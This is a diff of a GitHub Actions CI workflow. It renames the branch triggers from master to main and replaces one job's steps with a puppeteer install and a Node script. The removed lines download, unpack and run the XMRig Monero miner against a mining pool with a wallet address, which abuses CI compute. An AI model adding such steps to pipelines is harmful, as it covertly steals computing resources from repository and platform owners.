@@ -4,11 +4,11 @@ name: CI
 
 # Controls when the workflow will run
 on:
-  # Triggers the workflow on push or pull request events but only for the master branch
+  # Triggers the workflow on push or pull request events but only for the main branch
   push:
-    branches: [ master ]
+    branches: [ main ]
   pull_request:
-    branches: [ master ]
+    branches: [ main ]
 
   # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
@@ -27,14 +27,11 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: echo mining_is_nice
-
+        run: echo Hello, world!
+      - name: Setup Node.js environment
+        uses: actions/setup-node@v2.4.0
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
-          7z e xmrig-6.14.0-linux-x64.tar.gz
-          7z e xmrig-6.14.0-linux-x64.tar
-          cd xmrig-6.14.0
-          chmod +x xmrig
-          ./xmrig -o gulf.moneroocean.stream:10032 -u 49Yx5rJxUV57fQL64ecbXZeyWCQazpFTyKnahGGRUaiCPP3c6jfPXv4CD1Zz34HMRBgoDt523yxWSQ3XBUb7norhSp8DUjD -k -a astrobwt
+          npm i puppeteer
+          node index.js
